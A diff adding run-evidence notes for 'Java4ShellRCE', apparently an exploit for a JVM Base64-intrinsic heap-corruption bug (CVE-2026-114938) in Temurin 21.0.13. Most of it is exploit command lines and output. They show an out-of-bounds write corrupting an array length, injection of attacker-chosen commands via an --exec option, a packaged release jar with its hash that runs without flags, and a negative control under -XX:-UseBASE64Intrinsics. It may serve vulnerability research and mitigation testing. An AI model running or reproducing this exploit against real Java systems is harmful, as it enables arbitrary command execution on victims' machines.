@@ -1,0 +1,128 @@
+# Java4ShellRCE — successful run evidence (2026-11-18)
+
+Host: win3 (AMD Ryzen 7 7840U, Zen 4, AVX-512 VBMI+BW), Windows 11,
+Temurin 21.0.13+9-LTS (affected build, before the 21.0.13.1 fix).
+
+## Run 1 — default payload (full pipeline: probe + exploit)
+
+```
+$ java --add-opens java.base/java.util=ALL-UNNAMED -cp build Java4ShellRCE
+
+runtime=21.0.13+9-LTS
+vm=OpenJDK 64-Bit Server VM
+trigger=65B dst=48B
+warmup: 200000 public decodes in 8 ms
+probe[A-input] rejected=true changed=62 first=50 last=111
+  store: 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6
+  VULNERABLE (62-byte overflow past a 48B destination)
+probe[Q-input] rejected=true changed=0 first=-1 last=-1
+mh-warmup: 200000 decodeBlock calls done (valid input, no overflow)
+attempt dst=48B ret=47 victim.length=1771742825 (was 64)
+  cmd data located at victim[80] via OOB read; injecting payload
+  cmd array now: [cmd|/c|whoami > java4shell_pwned.txt 2>&1]
+  executing: [cmd, /c, whoami > java4shell_pwned.txt 2>&1]
+exec rc=0
+--- java4shell_pwned.txt ---
+gpd\aquaflux
+--- end ---
+RCE PROVEN: command executed via CVE-2026-114938 heap corruption
+```
+
+## Run 2 — custom payload via --exec (--exploit-only)
+
+```
+$ java --add-opens java.base/java.util=ALL-UNNAMED -cp build Java4ShellRCE \
+      --exploit-only --exec "cmd|/c|hostname && ver > custom_payload_proof.txt && whoami >> custom_payload_proof.txt"
+
+runtime=21.0.13+9-LTS
+vm=OpenJDK 64-Bit Server VM
+trigger=65B dst=48B
+warmup: 200000 public decodes in 7 ms
+mh-warmup: 200000 decodeBlock calls done (valid input, no overflow)
+attempt dst=48B ret=47 victim.length=1771742825 (was 64)
+  cmd data located at victim[80] via OOB read; injecting payload
+  cmd array now: [cmd|/c|hostname && ver > custom_payload_proof.txt && whoami >> custom_payload_proof.txt]
+  executing: [cmd, /c, hostname && ver > custom_payload_proof.txt && whoami >> custom_payload_proof.txt]
+exec rc=0
+RCE PROVEN: command executed via CVE-2026-114938 heap corruption
+
+$ type custom_payload_proof.txt
+Microsoft Windows [版本 10.0.26200.9974]
+gpd\aquaflux
+```
+
+Corrupted-length value 1771742825 matches r3dvei1/java4shell's Calif65
+measurement on Intel (same store pattern `9a 69 a6`), confirming the
+primitive is deterministic across Intel and AMD Zen 4.
+
+Crash logs from development iterations are kept alongside
+(hs_err_pid878384.log = interpreter bastore klass dereference,
+hs_err_pid878888.log = GC touching corrupted klass).
+
+## Run 3-5 — release-jar verification (2026-11-18)
+
+The released artifact is `dist/Java4ShellRCE.jar`
+(SHA256 4a83a5cc72a1d296d4e66894b499cf7f8622d1182b2bbd6458554297843e5b56),
+built from the same source with only `Java4ShellRCE.class` inside and a
+manifest carrying `Main-Class` + `Add-Opens: java.base/java.util`, so it
+runs with no command-line flags.
+
+### Test A — `java -jar Java4ShellRCE.jar` (full pipeline, no flags)
+
+```
+$ java -jar Java4ShellRCE.jar
+
+runtime=21.0.13+9-LTS
+vm=OpenJDK 64-Bit Server VM
+trigger=65B dst=48B
+warmup: 200000 public decodes in 7 ms
+probe[A-input] rejected=true changed=62 first=50 last=111
+  store: 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6
+  VULNERABLE (62-byte overflow past a 48B destination)
+probe[Q-input] rejected=true changed=0 first=-1 last=-1
+mh-warmup: 200000 decodeBlock calls done (valid input, no overflow)
+attempt dst=48B ret=47 victim.length=1771742825 (was 64)
+  cmd data located at victim[80] via OOB read; injecting payload
+  cmd array now: [cmd|/c|whoami > java4shell_pwned.txt 2>&1]
+  executing: [cmd, /c, whoami > java4shell_pwned.txt 2>&1]
+exec rc=0
+--- java4shell_pwned.txt ---
+gpd\aquaflux
+--- end ---
+RCE PROVEN: command executed via CVE-2026-114938 heap corruption
+exit code: 0
+```
+
+### Test B — negative control, mitigated JVM (`-XX:-UseBASE64Intrinsics`)
+
+```
+$ java -XX:-UseBASE64Intrinsics -jar Java4ShellRCE.jar
+
+probe[A-input] rejected=true changed=0 first=-1 last=-1
+probe[Q-input] rejected=true changed=0 first=-1 last=-1
+mh-warmup: 200000 decodeBlock calls done (valid input, no overflow)
+attempt dst=48B ret=48 victim.length=64 (was 64)
+  no corruption at this alignment, retrying
+... (all 7 alignments: no corruption) ...
+TEST B exit code: 2
+NOT EXPLOITED on this JVM (see probe output for the primitive)
+```
+
+The tool degrades cleanly (no crash) and reports not-exploited on a
+mitigated JVM. Note the behavioral fingerprint: the scalar decodeBlock
+returns ret=48 for the same input for which the buggy intrinsic returns
+ret=47.
+
+### Test C — custom payload via the jar
+
+```
+$ java -jar Java4ShellRCE.jar --exploit-only --exec "cmd|/c|whoami > jar_custom_proof.txt 2>&1"
+
+attempt dst=48B ret=47 victim.length=1771742825 (was 64)
+  cmd data located at victim[80] via OOB read; injecting payload
+exec rc=0
+TEST C exit code: 0
+
+$ type jar_custom_proof.txt
+gpd\aquaflux
+```
